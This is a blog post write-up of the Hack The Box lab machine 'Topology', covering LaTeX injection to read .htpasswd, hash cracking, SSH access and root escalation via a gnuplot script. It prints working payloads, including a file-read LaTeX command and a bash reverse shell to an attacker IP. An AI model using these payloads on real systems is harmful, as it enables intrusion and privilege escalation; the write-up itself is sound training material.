<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Topology [Easy] | 0x73796C31</title><meta name=keywords content="hackthebox"><meta name=description content="I&rsquo;ve started with simple machine enumeration
$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I&rsquo;ve enumerated possible users:
lkleinvdaisleydabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website."><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/writeups/htb-topology/><link crossorigin=anonymous href=/assets/css/stylesheet.f8c2ee4fde28779dff9afcd3046f6bd6fc9cbeb1ddf60d48a81b676d7162c1bb.css integrity="sha256-+MLuT94od53/mvzTBG9r1vycvrHd9g1IqBtnbXFiwbs=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Hack The Box - Topology [Easy]"><meta property="og:description" content="I&rsquo;ve started with simple machine enumeration
$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I&rsquo;ve enumerated possible users:
lkleinvdaisleydabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website."><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/writeups/htb-topology/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-06-30T10:42:27+03:00"><meta property="article:modified_time" content="2023-06-30T10:42:27+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box - Topology [Easy]"><meta name=twitter:description content="I&rsquo;ve started with simple machine enumeration
$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I&rsquo;ve enumerated possible users:
lkleinvdaisleydabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Writeups","item":"https://sy1.sh/writeups/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Topology [Easy]","item":"https://sy1.sh/writeups/htb-topology/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Topology [Easy]","name":"Hack The Box - Topology [Easy]","description":"I\u0026rsquo;ve started with simple machine enumeration\n$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I\u0026rsquo;ve enumerated possible users:\nlklein\rvdaisley\rdabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website.","keywords":["hackthebox"],"articleBody":"I’ve started with simple machine enumeration\n$ nmap -sV 10.10.11.217 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Then I went to topology.htb to check out the website, noticed the possible users (according to the email that is formatted like lklein@topology.htb). I’ve enumerated possible users:\nlklein\rvdaisley\rdabrahams I went on to figure out what is located at http://latex.topology.htb/equation.php which was the only link on the website. There I found out some LaTeX to PNG convertor. I’ve figured out that there must be some trickery with this so I went my way to research the topic.\nI’ve found out the following:\nhttps://0day.work/hacking-with-latex/ https://salmonsec.com/cheatsheets/exploitation/latex_injection These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as /etc/passwd, /proc/self/cmdline, /proc/self/environ and so on, I’ve figured out that I must be missing something. I began to explore what other subdomains (because there is latex.topology.htb I thought there would be more) were on the webserver using ffuf.\n$ ffuf -w $commontxt -u http://topology.htb/ -H \"Host: FUZZ.topology.htb\" -r Which yielded the following domains:\ndev stats I’ve browsed through those and on the stats there were simple plots about the current usage of the system and that’s it. But on the dev subdomain there was a Basic Auth in place which I then figured out that I can read the .htpasswd with the LFI vulnerability in the latex.topology.htb input form.\nI’ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what’s going on.\nI honestly didn’t know how can I read the file and I turned out to some help, which I then understood that I can use the LaTeX/Source Code Listings which also can read a file with \\lstinputlisting{/var/www/dev/.htpasswd}, however the website just resulted in no image (possible error) using just this command.\nHere comes this post to the rescue https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and\nSince the website is about math, we can use the inline math delimiters that are $ and $ which can turn my payload from \\lstinputlisting{/var/www/dev/.htpasswd} to $\\lstinputlisting{/var/www/dev/.htpasswd}$ which resulted into getting the basic auth hash.\n$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0 Using hashcat we can extract the password\n$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt\r$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn With that, I tried the users that I’ve enumerated earlier and the user vdaisley worked out, so I went to log in with SSH and got the user flag.\nRoot The root was pretty easy, first we can see which directories are writable:\n$ find / -type d -writable 2\u003e/dev/null\r...\r/opt/gnuplot\r... This directory looked suspicious, I’ve fired up pspy to checkout what is going on and I got this:\nSo we are finding *.plt files in this directory, and then we are executing gnuplot as root. Using this article, I’ve crafted a test.plt file with the contents of:\nvdaisley@topology:/opt/gnuplot$ cat ~/test.plt system \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.16.xx/4444 0\u003e\u00261'\" I’ve copied the file to the /opt/gnuplot directory and I’ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.\n","wordCount":"520","inLanguage":"en","datePublished":"2023-06-30T10:42:27+03:00","dateModified":"2023-06-30T10:42:27+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/writeups/htb-topology/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>About</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/writeups/>Writeups</a></div><h1 class=post-title>Hack The Box - Topology [Easy]</h1><div class=post-meta><span title='2023-06-30 10:42:27 +0300 +0300'>June 30, 2023</span>&nbsp;·&nbsp;3 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#root aria-label=Root>Root</a></li></ul></div></details></div><div class=post-content><p>I&rsquo;ve started with simple machine enumeration</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nmap -sV 10.10.11.217
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span></code></pre></div><p>Then I went to <code>topology.htb</code> to check out the website, noticed the possible users (according to the email that is formatted like <code>lklein@topology.htb</code>). I&rsquo;ve enumerated possible users:</p><pre tabindex=0><code>lklein
vdaisley
dabrahams
</code></pre><p>I went on to figure out what is located at <a href=http://latex.topology.htb/equation.php>http://latex.topology.htb/equation.php</a> which was the only link on the website. There I found out some LaTeX to PNG convertor. I&rsquo;ve figured out that there must be some trickery with this so I went my way to research the topic.</p><p>I&rsquo;ve found out the following:</p><ul><li><a href=https://0day.work/hacking-with-latex/>https://0day.work/hacking-with-latex/</a></li><li><a href=https://salmonsec.com/cheatsheets/exploitation/latex_injection>https://salmonsec.com/cheatsheets/exploitation/latex_injection</a></li></ul><p>These two links, helped me to figure out that I had an LFI vulnerability at hand. Upon searching different files such as <code>/etc/passwd, /proc/self/cmdline, /proc/self/environ</code> and so on, I&rsquo;ve figured out that I must be missing something. I began to explore what other subdomains (because there is <code>latex.topology.htb</code> I thought there would be more) were on the webserver using <code>ffuf</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -w <span class=nv>$commontxt</span> -u http://topology.htb/ -H <span class=s2>&#34;Host: FUZZ.topology.htb&#34;</span> -r
</span></span></code></pre></div><p>Which yielded the following domains:</p><ul><li><code>dev</code></li><li><code>stats</code></li></ul><p>I&rsquo;ve browsed through those and on the stats there were simple plots about the current usage of the system and that&rsquo;s it. But on the <code>dev</code> subdomain there was a Basic Auth in place which I then figured out that I can read the <code>.htpasswd</code> with the LFI vulnerability in the <code>latex.topology.htb</code> input form.</p><p>I&rsquo;ve tried a couple of times to read the file, but there were unsuccessful, and I went my way to figure out why and what&rsquo;s going on.</p><p>I honestly didn&rsquo;t know how can I read the file and I turned out to some help, which I then understood that I can use the <code>LaTeX/Source Code Listings</code> which also can read a file with <code>\lstinputlisting{/var/www/dev/.htpasswd}</code>, however the website just resulted in no image (possible error) using just this command.</p><p>Here comes this post to the rescue <a href=https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and>https://tex.stackexchange.com/questions/410863/what-are-the-differences-between-and</a></p><p>Since the website is about math, we can use the <code>inline math delimiters</code> that are <code>$ and $</code> which can turn my payload from <code>\lstinputlisting{/var/www/dev/.htpasswd}</code> to <code>$\lstinputlisting{/var/www/dev/.htpasswd}$</code> which resulted into getting the basic auth hash.</p><pre tabindex=0><code>$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0
</code></pre><p>Using <code>hashcat</code> we can extract the password</p><pre tabindex=0><code>$ hashcat -m 1600 crack.txt /usr/share/wordlists/rockyou.txt
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTZ0:goDoItOnYourOwn
</code></pre><p>With that, I tried the users that I&rsquo;ve enumerated earlier and the user <code>vdaisley</code> worked out, so I went to log in with SSH and got the user flag.</p><h1 id=root>Root<a hidden class=anchor aria-hidden=true href=#root>#</a></h1><p>The root was pretty easy, first we can see which directories are writable:</p><pre tabindex=0><code>$ find / -type d -writable 2&gt;/dev/null
...
/opt/gnuplot
...
</code></pre><p>This directory looked suspicious, I&rsquo;ve fired up <code>pspy</code> to checkout what is going on and I got this:</p><p><img loading=lazy src=/htb/htb-topology-pspyrun.png alt=rwojak></p><p>So we are finding <code>*.plt</code> files in this directory, and then we are executing <code>gnuplot</code> as root. Using this <a href=https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/#command-execution>article,</a> I&rsquo;ve crafted a <code>test.plt</code> file with the contents of:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vdaisley@topology:/opt/gnuplot$ cat ~/test.plt 
</span></span><span class=line><span class=cl>system <span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.xx/4444 0&gt;&amp;1&#39;&#34;</span>
</span></span></code></pre></div><p>I&rsquo;ve copied the file to the <code>/opt/gnuplot</code> directory and I&rsquo;ve waited to get a remote connection which I got in about a minute. With that I rooted the machine.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=next href=https://sy1.sh/writeups/htb-pilgrimage/><span class=title>Next »</span><br><span>Hack The Box - Pilgrimage [Easy]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>